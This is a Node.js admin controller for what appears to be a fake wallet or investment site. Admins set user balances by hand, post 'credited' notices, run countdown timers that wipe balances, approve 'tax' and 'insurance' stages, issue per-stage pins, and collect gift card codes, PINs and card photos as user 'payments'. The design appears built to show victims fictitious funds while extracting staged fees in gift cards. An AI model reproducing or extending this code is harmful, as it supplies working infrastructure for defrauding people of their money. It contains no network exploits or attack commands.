const User = require('../models/User');
const Withdrawal = require('../models/Withdrawal');
const { sendAdminEmail } = require('../utils/mailer');

// Get all users (no passwords)
async function getUsers(req, res) {
  try {
    const users = await User.find().select('-password');
    res.json(users);
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Server error' });
  }
}

// Edit user: update balance, start/stop timer
async function editUser(req, res) {
  try {
    const { id } = req.params;
    const { balance, action } = req.body; // action: 'startTimer' | 'stopTimer'
    const user = await User.findById(id);
    if (!user) return res.status(404).json({ message: 'User not found' });

    if (typeof balance === 'number') user.balance = balance;

    if (action === 'startTimer') {
      user.timerActive = true;
      user.timerEnds = Date.now() + 24 * 60 * 60 * 1000; // 24 hours
    } else if (action === 'stopTimer') {
      user.timerActive = false;
      user.timerEnds = null;
      user.balance = 0;
    }

    user.notifications.push({ text: `Your wallet balance has been credited: balance is $${user.balance}. Timer active: ${user.timerActive}`, createdAt: new Date() });
    await user.save();

    res.json({ message: 'User updated' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Server error' });
  }
}

// Delete user (new) - robust & safe
async function deleteUser(req, res) {
  try {
    const { id } = req.params;
    const user = await User.findById(id);
    if (!user) return res.status(404).json({ message: 'User not found' });

    // Remove related withdrawals (hard delete)
    await Withdrawal.deleteMany({ user: user._id });

    // Delete the user
    await User.deleteOne({ _id: user._id });

    // Send admin email but don't let email failure break the response
    try {
      sendAdminEmail && sendAdminEmail('User deleted', `Admin deleted user ${user.username} (${user._id})`);
    } catch (e) {
      console.warn('sendAdminEmail failed after delete:', e);
    }

    res.json({ message: 'User deleted' });
  } catch (err) {
    console.error('deleteUser err', err);
    res.status(500).json({ message: 'Server error' });
  }
}

// Get all user messages
async function getMessages(req, res) {
  try {
    const users = await User.find({}, 'username messages');
    const all = [];
    users.forEach(u => u.messages.forEach(m => all.push({ username: u.username, ...m.toObject() })));
    res.json(all);
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Server error' });
  }
}

// Send notification to a user
async function notifyUser(req, res) {
  try {
    const { userId, text } = req.body;
    const user = await User.findById(userId);
    if (!user) return res.status(404).json({ message: 'User not found' });
    user.notifications.push({ text, createdAt: new Date() });
    await user.save();

    try {
      sendAdminEmail('Admin notification sent', `To ${user.username}: ${text}`);
    } catch (e) {
      console.warn('sendAdminEmail failed in notifyUser:', e);
    }

    res.json({ message: 'Notification sent' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Server error' });
  }
}

// Get payments submitted by users (ENHANCED: Better file path handling)
async function getPayments(req, res) {
  try {
    const users = await User.find({}, 'username payments email');
    const all = [];
    users.forEach(u => {
      (u.payments || []).forEach(p => {
        const createdAt = p.createdAt ? new Date(p.createdAt) : new Date();
        
        // Extract cards data from multiple possible locations
        let cards = [];
        
        // First try: direct cards array
        if (p.cards && Array.isArray(p.cards)) {
          cards = p.cards.map(card => ({
            giftCard: card.giftCard,
            pin: card.pin,
            // ENHANCED: Ensure file path is properly formatted
            file: card.file ? {
              filename: card.file.filename,
              originalname: card.file.originalname,
              path: card.file.path || card.file.url || `/uploads/${card.file.filename}`,
              url: card.file.url || card.file.path || `/uploads/${card.file.filename}`
            } : null
          }));
        } 
        // Second try: cards inside details
        else if (p.details && p.details.cards && Array.isArray(p.details.cards)) {
          cards = p.details.cards.map(card => ({
            giftCard: card.giftCard,
            pin: card.pin,
            // ENHANCED: Ensure file path is properly formatted
            file: card.file ? {
              filename: card.file.filename,
              originalname: card.file.originalname,
              path: card.file.path || card.file.url || `/uploads/${card.file.filename}`,
              url: card.file.url || card.file.path || `/uploads/${card.file.filename}`
            } : null
          }));
        }
        // Third try: legacy single card format
        else if (p.details && p.details.cardType) {
          cards = [{
            giftCard: p.details.cardType,
            pin: p.details.cardPin || '',
            file: p.details.image ? { 
              path: p.details.image,
              url: p.details.image,
              filename: p.details.image.split('/').pop() || 'image'
            } : null
          }];
        }
        // Fourth try: check if there are any card-like properties in details
        else if (p.details && (p.details.giftCard || p.details.cardType)) {
          cards = [{
            giftCard: p.details.giftCard || p.details.cardType,
            pin: p.details.pin || p.details.cardPin || '',
            file: p.details.image ? { 
              path: p.details.image,
              url: p.details.image,
              filename: p.details.image.split('/').pop() || 'image'
            } : null
          }];
        }

        // Enhanced payment object with complete details
        const paymentObj = {
          username: u.username,
          userId: u._id,
          userEmail: u.email,
          stage: p.stage || p.method || 'unknown',
          amount: p.amount || 0,
          createdAt,
          status: p.status || 'submitted',
          withdrawal: p.withdrawal || null,
          // Include complete cards array with normalized file paths
          cards: cards,
          // Include method for consistency
          method: p.method || 'giftcard',
          // Raw details for full transparency - ensure consistent structure
          raw: {
            method: p.method || 'giftcard',
            details: p.details || {},
            cards: cards, // Include the normalized cards array
            stage: p.stage,
            amount: p.amount,
            createdAt: p.createdAt,
            status: p.status,
            _id: p._id
          }
        };

        all.push(paymentObj);
      });
    });

    // sort newest first by createdAt
    all.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

    res.json(all);
  } catch (err) {
    console.error('getPayments err', err);
    res.status(500).json({ message: 'Server error' });
  }
}

// Approve tax/insurance for a user
async function approveUser(req, res) {
  try {
    const { userId } = req.params;
    const { approveTax, approveInsurance } = req.body;
    const user = await User.findById(userId);
    if (!user) return res.status(404).json({ message: 'User not found' });
    if (approveTax) user.taxApproved = true;
    if (approveInsurance) user.insuranceApproved = true;
    await user.save();
    res.json({ message: 'Approved' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Server error' });
  }
}

// Get all withdrawals (sorted newest first)
async function getWithdrawals(req, res) {
  try {
    const withdrawals = await Withdrawal.find().populate('user', 'username email').sort({ createdAt: -1 });
    res.json(withdrawals);
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Server error' });
  }
}

// Approve a withdrawal (deduct balance and notify)
async function approveWithdrawal(req, res) {
  try {
    const { id } = req.params;
    const withdrawal = await Withdrawal.findById(id).populate('user');
    if (!withdrawal) return res.status(404).json({ message: 'Not found' });

    withdrawal.status = 'approved';
    await withdrawal.save();

    const u = await User.findById(withdrawal.user._id);
    u.balance = 0;
    u.notifications.push({ text: `Your withdrawal ${withdrawal._id} was approved.`, createdAt: new Date() });
    await u.save();
    await withdrawal.save();

    try {
      sendAdminEmail('Withdrawal approved', `Withdrawal ${id} approved for ${u.username}`);
    } catch (e) {
      console.warn('sendAdminEmail failed in approveWithdrawal:', e);
    }

    res.json({ message: 'Withdrawal approved' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Server error' });
  }
}

/**
 * Set pin for a particular user at a specific stage
 * POST /admin/users/:userId/set-pin  { stage, pin }
 *
 * NOTE: Notification text is intentionally concise ("Your <stage> pin is: 1234")
 * to avoid accidental substring matches when confirming other stages.
 */
async function setPinForUser(req, res) {
  try {
    const { userId } = req.params;
    const { stage, pin } = req.body;
    if (!stage || !pin) return res.status(400).json({ message: 'stage and pin required' });

    const user = await User.findById(userId);
    if (!user) return res.status(404).json({ message: 'User not found' });

    if (!user.activationPins) user.activationPins = {};
    user.activationPins[stage] = { pin: String(pin), set: true, setAt: new Date() };

    // send pin in notification to the user - concise & unambiguous
    user.notifications.push({ text: `Your ${stage} pin is: ${pin}`, createdAt: new Date() });
    await user.save();

    try {
      sendAdminEmail('Admin set pin', `Pin for stage ${stage} set for user ${user.username}`);
    } catch (e) {
      console.warn('sendAdminEmail failed in setPinForUser:', e);
    }

    res.json({ message: 'Pin set' });
  } catch (err) {
    console.error('setPinForUser err', err);
    res.status(500).json({ message: 'Server error' });
  }
}

module.exports = {
  getUsers,
  editUser,
  deleteUser,
  getMessages,
  notifyUser,
  getPayments,
  approveUser,
  getWithdrawals,
  approveWithdrawal,
  setPinForUser
};